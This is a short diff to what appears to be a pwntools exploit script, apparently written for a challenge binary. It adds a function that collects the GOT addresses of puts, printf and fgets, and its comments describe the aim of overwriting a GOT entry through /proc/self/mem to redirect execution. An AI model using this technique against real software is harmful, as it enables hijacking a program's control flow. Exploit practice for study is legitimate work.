@@ -134,6 +134,36 @@ def stdin_buffer_trick():
     
     return True
 
+def find_got_address():
+    """
+    Find GOT addresses to overwrite via /proc/self/mem
+    
+    The Global Offset Table (GOT) contains addresses of library functions.
+    By overwriting a GOT entry via /proc/self/mem, we can redirect execution.
+    """
+    log.info("Finding GOT addresses for exploitation")
+    
+    # Load the binary with pwntools
+    try:
+        elf = ELF(BINARY, checksec=False)
+    except:
+        log.error("Could not load binary")
+        return {}
+    
+    # Find GOT entries we can overwrite
+    got_entries = {
+        'puts': elf.got.get('puts', None),
+        'printf': elf.got.get('printf', None),
+        'fgets': elf.got.get('fgets', None),
+    }
+    
+    log.info("GOT entries:")
+    for func, addr in got_entries.items():
+        if addr:
+            log.info(f"  {func}: 0x{addr:x}")
+    
+    return got_entries
+
 def write_payload_multipart(target_file, payload):
     """
     Write a multi-byte payload to a file by calling the binary multiple times
